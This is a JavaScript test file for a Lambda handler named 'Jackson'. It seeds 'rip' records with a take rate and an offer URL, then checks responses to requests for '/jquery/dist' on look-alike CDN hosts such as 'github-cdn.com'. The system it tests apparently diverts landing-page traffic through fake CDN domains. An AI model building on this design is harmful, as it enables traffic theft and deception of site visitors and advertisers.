import moment from 'moment';
import _ from 'lodash';
import {
    expect,
} from 'chai';

import MongoDao from '../../../../../../../lib/jackson-core/lib/dao/mongo-dao';
import RedisDao from '../../../../../../../lib/jackson-core/lib/dao/redis-dao';
import Config from '../../../../../../../lib/jackson-core/config';

import lambda from '../../../../../../../src';

describe('Jackson Lambda', () => {
  describe('Expected to', () => {
    describe('Given correct input', () => {
      describe('the domain github-cdn.com will', () => {
        const validEvent = {
          path: '/jquery/dist',
          httpMethod: 'GET',
          headers: {
            Host: 'github-cdn.com',
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-For': '2602:304:ce3e:27f0:1e:abc8:9568:8b1, 205.251.214.90',
            'X-Alt-Referer': 'http://yourtrendingnews.com/lebron/?voluumdata=BASE64dmlkLi4wMDAwMDAwMi05N2UwLTQ1NDctODAwMC0wMDAwMDAwMDAwMDBfX3ZwaWQuLjZhOGIyODAwLTQ1NTktMTFlNy04MjJjLTdiNmFjYmQ1YmZiNV9fY2FpZC4uYmZkNjA5MTAtMzlmYS00M2U2LThjZmItN2Y0MGFhMmFhOGJiX19ydC4uUl9fbGlkLi4zYTNhMWRjNy1lZTc5LTRjMWItYTI3Ni1iN2VhMDViZGIzZjBfX29pZDEuLmI4MWFjYWNkLWI3Y2UtNDUxOC1hN2E3LTg0MjI3OTcxNGY5ZF9fdmFyMS4ubW9iaWxlcG9zc2UtaG90bGlua3NfX3ZhcjIuLkpvcmRhbiBDYWxscyBPdXQgTGVicm9uX192YXIzLi5odHRwOi8vbGwtbWVkaWFcLlx0bXpcLlxjb20vMjAxMy8xMC8wMS8xMDAxLWpvcmRhbi1sZWJyb24ta29iZS0zXC5canBnX19yZC4uc3BvcnRzdXBkYXRlcnNcLlxjb21fX2FpZC4uX19hYi4uX19zaWQuLl9fY3JpLi5fX3B1Yi4uX19kaWQuLl9fZGl0Li5fX3BpZC4uX19pdC4uX192dC4uMTQ5NjE2NDg1MjQzOA&site=mobileposse-hotlinks&title=Jordan%20Calls%20Out%20Lebron&thumbnail=http://ll-media.tmz.com/2013/10/01/1001-jordan-lebron-kobe-3.jpg?txid=554c3823-aff6-f548-ce9b-1b5df2ac267c',
            Referer: 'https://some-lander.com/landingpage.html',
          },
          stageVariables: {
            redirectHost: 'github.com',
            alias: 'test',
          },
        };

        const testUserUUID = '554c3823-aff6-f548-ce9b-1b5df2ac267c';
        const testUser = {
          _id: '6240a8e8b5cabc3836c14593',
          name: 'Test User',
          email: 'testuser@gmail.com',
          created_on: new Date(),
          last_updated: new Date(),
          uuids: [
            { uuid: testUserUUID },
          ],
          config: {
            last_updated: new Date(),
            min_minutes_consecutive_traffic: 0,
            min_daily_hits_to_take: 0,
            min_hits_per_min_to_take: 0,
          },
        };

        // This rip needs to match the userConfig for testUser so that it will always rip
        const hour = moment().format('H');
        const geo = { country: 'US' };
        const rip = {
          url: 'some-lander.com/landingpage.html',
          uuid: testUserUUID,
          take_rate: 1,
          offer: {
            _id: 'offer-id',
            url: 'http://testurl.com',
          },
          hits_per_min: 15,
          consecutive_min_traffic: 5,
          archive: {
            hourly: [
              {
                hour,
                hits: [
                  { cc: geo.country, hits: 100 },
                ],
              },
            ],
          },
        };

        beforeEach((done) => {
          // Before each test we need to create all necessary conditions for a jack.
          // This means addig the user with correct configuration, creating the rip
          // so a new one isn't created (which would forward us), and any other information
          // we need. URL should have a take_rate of 100%, and config should have thresholds
          // set to instant jack.

          const redisDao = new RedisDao({
            config: new Config({ stageVariables: validEvent.stageVariables }).redisDaoConfig(),
          });
          const mongoDao = new MongoDao({
            config: new Config({ stageVariables: validEvent.stageVariables }).mongoDaoConfig(),
          });

          mongoDao.removeRip(rip.url)
          // Remove rip from db and redis
          .then(() => redisDao.delKey(rip.url))
          .then(() => mongoDao.createRip(rip, geo))
          .then(() => mongoDao.createUser(testUser))
          .then(() => redisDao.closeConnection())
          .then(() => mongoDao.closeConnection())
          .then(() => {
            done();
          });
        });

        afterEach((done) => {
          // After each test, we need to completely reset the system. This means
          // we need to remove the tested items from the cache, and mongo.

          const redisDao = new RedisDao({
            config: new Config({ stageVariables: validEvent.stageVariables }).redisDaoConfig(),
          });
          const mongoDao = new MongoDao({
            config: new Config({ stageVariables: validEvent.stageVariables }).mongoDaoConfig(),
          });

          // Remove rip from redis
          redisDao.removeRip(rip.url)
          // Remove config from redis
          .then(() => redisDao.delKey(testUser._id))
          .then(() => mongoDao.removeRip(rip.url))
          .then(() => redisDao.delWhitelistedDomains())
          .then(() => mongoDao.removeUser(testUser))
          .then(() => redisDao.closeConnection())
          .then(() => mongoDao.closeConnection())
          .then(() => {
            done();
          });
        });

        it('Respond to GET request from http://github-cdn.com/jquery/dist', (done) => {
          lambda.handler(validEvent, {}, (err, response) => {
            try {
              expect(err).to.equal(null);
              const {
                headers = {},
              } = response;
              expect(headers.Location).to.equal(undefined);
              done();
            } catch (e) {
              done(e);
            }
          });
        });

        it('Respond to POST request from http://github-cdn.com/jquery/dist', (done) => {
          // Only need to give a body version, no X-Alt-Referer header since this is a POST.
          lambda.handler({
            ...validEvent,
            headers: _.omit(validEvent.headers, ['X-Alt-Referer']),
            httpMethod: 'POST',
            body: {
              version: '554c3823-aff6-f548-ce9b-1b5df2ac267c',
            },
          }, {}, (err, response) => {
            try {
              expect(err).to.equal(null);
              const {
                headers = {},
              } = response;
              expect(headers.Location).to.equal(undefined);
              done();
            } catch (e) {
              done(e);
            }
          });
        });
      });
    });
  });
});


// Example Input
// {
//   resource: '/{proxy+}',
//   path: '/favicon.ico',
//   httpMethod: 'GET',
//   headers: {
//     Accept: 'image/webp,image/*,*/*;q=0.8',
//     'Accept-Encoding': 'gzip, deflate, sdch, br',
//     'Accept-Language': 'en-US,en;q=0.8,nb;q=0.6',
//     'cache-control': 'no-cache',
//     'CloudFront-Forwarded-Proto': 'https',
//     'CloudFront-Is-Desktop-Viewer': 'true',
//     'CloudFront-Is-Mobile-Viewer': 'false',
//     'CloudFront-Is-SmartTV-Viewer': 'false',
//     'CloudFront-Is-Tablet-Viewer': 'false',
//     'CloudFront-Viewer-Country': 'US',
//     Host: 'cloudflare.cdnjs.io',
//     pragma: 'no-cache',
//     Referer: 'https://test.cdnjs.io/jquery/dist',
//     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5)
//      AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
//     Via: '2.0 ee9d39c7785a9185384280d8c69fefec.cloudfront.net (CloudFront)',
//     'X-Amz-Cf-Id': 'T7u92NMClHSTAo57gkD_TqhPgo7Sa3LrhhWCNlkKlyn5SPPCVkuEFA==',
//     'X-Amzn-Trace-Id': 'Root=1-592ce320-60774ca065fe69b175362eee',
//     'X-Forwarded-For': '2602:304:ce3e:27f0:1e:abc8:9568:8b1, 205.251.214.90',
//     'X-Forwarded-Port': '443',
//     'X-Forwarded-Proto': 'https',
//   },
//   queryStringParameters: null,
//   pathParameters: {
//     proxy: 'favicon.ico',
//   },
//   stageVariables: {
//     redirectHost: 'cdnjs.cloudflare.com',
//     alias: 'test',
//   },
//   requestContext: {
//     path: '/favicon.ico',
//     accountId: '834835117621',
//     resourceId: '265ues',
//     stage: 'test',
//     requestId: 'd21c5110-44e5-11e7-bfdc-5fcdc2e1bed7',
//     identity: {
//       cognitoIdentityPoolId: null,
//       accountId: null,
//       cognitoIdentityId: null,
//       caller: null,
//       apiKey: '',
//       sourceIp: '2602:304:ce3e:27f0:1e:abc8:9568:8b1',
//       accessKey: null,
//       cognitoAuthenticationType: null,
//       cognitoAuthenticationProvider: null,
//       userArn: null,
//       userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36
//        (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
//       user: null,
//     },
//     resourcePath: '/{proxy+}',
//     httpMethod: 'GET',
//     apiId: 'amghtfwws9',
//   },
//   body: null,
//   isBase64Encoded: false,
// }
